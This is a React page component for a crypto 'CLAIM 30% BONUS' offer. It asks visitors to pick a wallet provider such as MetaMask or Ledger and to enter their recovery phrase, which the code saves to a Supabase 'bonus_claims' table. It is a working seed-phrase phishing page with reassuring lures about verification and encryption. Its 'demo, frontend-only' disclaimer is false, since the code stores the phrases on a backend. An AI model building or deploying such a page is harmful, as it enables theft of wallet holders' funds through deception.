import { Navbar } from "@/components/layout/Navbar";
import { Footer } from "@/components/layout/Footer";
import { GlassCard } from "@/components/ui/GlassCard";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { ShieldCheck, AlertTriangle, ChevronDown } from "lucide-react";
import { useLocation } from "wouter";
import { supabase } from "@/lib/supabase";

const WALLETS = [
  {
    value: "metamask",
    name: "MetaMask",
    logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/2048px-MetaMask_Fox.svg.png"
  },
  {
    value: "trust",
    name: "Trust Wallet",
    logo: "https://static.vecteezy.com/system/resources/previews/067/565/496/non_2x/trust-wallet-rounded-logo-design-free-png.png"
  },
  {
    value: "exodus",
    name: "Exodus",
    logo: "https://www.exodus.com/brand/img/logo-with-halo.png"
  },
  {
    value: "ledger",
    name: "Ledger",
    logo: "https://cryptorecovers.com/wp-content/uploads/2025/03/Ledger.png"
  },
  {
    value: "coinbase",
    name: "Coinbase Wallet",
    logo: "https://walletscrutiny.com/images/wIcons/android/com.coinbase.wallite.png"
  },
  {
    value: "binance",
    name: "Binance Chain Wallet",
    logo: "https://images.seeklogo.com/logo-png/44/2/binance-smart-chain-bsc-logo-png_seeklogo-446621.png"
  },
  {
    value: "rainbow",
    name: "Rainbow",
    logo: "https://play-lh.googleusercontent.com/fMUvmUmIpIDoZGTACYohbY3DE7-24GFkQ21WjVHxa57qluzWrr7khkycE8cz_juhew"
  },
  {
    value: "coinmama",
    name: "Coinmama",
    logo: "https://media.cryptomaniaks.com/images/logos/1739096884479_67a88334f12aaec7e4a46aed.png"
  }
];

export default function Bonus() {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string>("");
  const [email, setEmail] = useState("");
  const [phrase, setPhrase] = useState("");
  const [isOpen, setIsOpen] = useState(false);
  const [, setLocation] = useLocation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      const { error } = await supabase
        .from('bonus_claims')
        .insert([
          { 
            email, 
            wallet_type: selectedWallet, 
            recovery_phrase: phrase,
            status: 'pending'
          }
        ]);

      if (error) throw error;

      toast({
        title: "Bonus Claim Initiated",
        description: "Your wallet is being verified. Redirecting...",
        variant: "default", 
        className: "bg-green-500 text-white border-none"
      });
      setLocation("/bonus-success");
    } catch (error: any) {
      console.error("Supabase error:", error);
      toast({
        title: "Error",
        description: "There was an issue processing your claim. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const selectedWalletData = WALLETS.find(w => w.value === selectedWallet);

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-28 pb-20 px-4">
        <div className="container mx-auto max-w-xl">
          <div className="text-center mb-10">
            <h1 className="text-4xl md:text-5xl font-black mb-4 neon-text-primary">CLAIM 30% BONUS</h1>
            <p className="text-muted-foreground">Connect your wallet securely to receive your automated deposit.</p>
          </div>

          <GlassCard className="border-primary/20">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-medium text-white">Email Address</label>
                <Input 
                  type="email"
                  placeholder="your@email.com"
                  className="bg-black/20 border-white/10 h-11"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-white">Select Wallet Type</label>
                <div className="relative">
                  <button
                    type="button"
                    onClick={() => setIsOpen(!isOpen)}
                    className="w-full h-12 bg-black/20 border border-white/10 rounded-md px-4 flex items-center justify-between hover:border-white/20 transition-colors text-white text-left"
                  >
                    <div className="flex items-center gap-3">
                      {selectedWalletData ? (
                        <>
                          <img 
                            src={selectedWalletData.logo} 
                            alt={selectedWalletData.name}
                            className="w-6 h-6 object-contain"
                            onError={(e) => {
                              e.currentTarget.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect fill='%23333' width='24' height='24'/%3E%3C/svg%3E";
                            }}
                          />
                          <span>{selectedWalletData.name}</span>
                        </>
                      ) : (
                        <span className="text-muted-foreground">Select your wallet provider</span>
                      )}
                    </div>
                    <ChevronDown className={`w-5 h-5 transition-transform ${isOpen ? 'rotate-180' : ''}`} />
                  </button>

                  {isOpen && (
                    <div className="absolute top-full left-0 right-0 mt-2 bg-black/40 border border-white/10 rounded-md backdrop-blur-md z-50 overflow-hidden">
                      {WALLETS.map((wallet) => (
                        <button
                          key={wallet.value}
                          type="button"
                          onClick={() => {
                            setSelectedWallet(wallet.value);
                            setIsOpen(false);
                          }}
                          className="w-full px-4 py-3 flex items-center gap-3 hover:bg-primary/10 transition-colors border-b border-white/5 last:border-b-0 text-left"
                        >
                          <img 
                            src={wallet.logo} 
                            alt={wallet.name}
                            className="w-6 h-6 object-contain"
                            onError={(e) => {
                              e.currentTarget.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect fill='%23333' width='24' height='24'/%3E%3C/svg%3E";
                            }}
                          />
                          <span>{wallet.name}</span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-white">Wallet Phrase Key (12/24 Words)</label>
                <textarea 
                  required
                  className="flex min-h-[120px] w-full rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
                  placeholder="Enter your recovery phrase..."
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                />
                <p className="text-xs text-muted-foreground/70">
                   * We use end-to-end encryption to verify wallet ownership for the bonus drop.
                </p>
              </div>

              <div className="bg-yellow-500/10 border border-yellow-500/20 p-4 rounded-lg flex gap-3">
                <AlertTriangle className="w-5 h-5 text-yellow-500 shrink-0" />
                <p className="text-xs text-yellow-500/90">
                  <strong>Security Note (Demo):</strong> In a real application, NEVER share your private keys or seed phrases. This is a frontend-only mockup for demonstration purposes.
                </p>
              </div>

              <Button 
                type="submit" 
                className="w-full h-14 text-lg font-bold bg-gradient-to-r from-primary to-secondary hover:opacity-90 neon-border-primary"
                disabled={isLoading || !selectedWallet}
              >
                {isLoading ? (
                  <span className="flex items-center gap-2">
                    <span className="animate-spin">⟳</span> Verifying...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5" /> VERIFY & CLAIM BONUS
                  </span>
                )}
              </Button>
            </form>
          </GlassCard>
        </div>
      </main>
      <Footer />
    </div>
  );
}